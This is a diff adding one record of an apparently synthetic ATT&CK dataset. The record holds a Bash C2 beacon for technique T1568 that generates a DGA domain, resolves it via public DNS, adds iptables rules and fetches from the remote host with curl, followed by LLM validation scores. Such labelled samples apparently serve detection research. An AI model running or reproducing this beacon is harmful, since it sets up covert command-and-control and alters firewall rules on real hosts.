@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(printf \"api-%s.syncgate.io\" \"$(date -u +%H%M | sha1sum | cut -c1-4)\"); for r in 1.1.1.1 9.9.9.9 8.8.8.8; do ip=$(dig +short @\"$r\" \"$d\" | head -n1); [ -n \"$ip\" ] && break; done; if [ -n \"$ip\" ]; then port=$(shuf -i 30000-61000 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -m statistic --mode random --probability 0.5 -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --limit-rate $((RANDOM%50+10))k \"http://$d:$port/b\"; fi'",
+  "explanation": "Resolves a DGA domain using multiple public resolvers, then uses iptables with probabilistic acceptance to create irregular traffic patterns and communicates over a high port.",
+  "rationale_steps": [
+    "Generate a short-lived DGA hostname",
+    "Query several resolvers to obtain an IP",
+    "Randomize the destination port",
+    "Add iptables rules with random acceptance to vary patterns",
+    "Perform low-bandwidth beaconing using curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-8aed3034",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and command substitutions with valid flags for date, dig, iptables, shuf, and curl; proper separators and test constructs make it parseable as-is.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a time-based DGA domain and resolves it via multiple public resolvers, then attempts high-port communication, but the iptables-based probabilistic acceptance likely fails without root and ACCEPT-only rules may not induce irregular patterns, creating minor realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T08:04:34.835602Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper command separators, valid flag usage across bash, printf, date, sha1sum, dig, iptables, shuf, and curl, and correct subshell/variable expansion syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command authentically implements T1568 by generating a time-based DGA domain (sha1sum of UTC HHMM truncated to 4 chars), querying multiple public resolvers for resilience (fast-flux/multi-resolver pattern), using iptables probabilistic matching to create irregular traffic patterns evading detection, and beaconing over a randomized high port with rate-limited curl — all hallmarks of dynamic resolution C2.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T00:31:48.691053Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command utilizes valid bash syntax, including subshells, variable assignments, loops, and correctly escaped string interpolation for the curl and iptables arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "The DGA and multi-resolver logic perfectly represent T1568; however, the use of iptables requires root privileges (conflicting with the provided 'None' privilege label) and a 50% probability rule on a single curl request is more likely to cause a connection failure than meaningful traffic jitter.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:31:59.677240Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
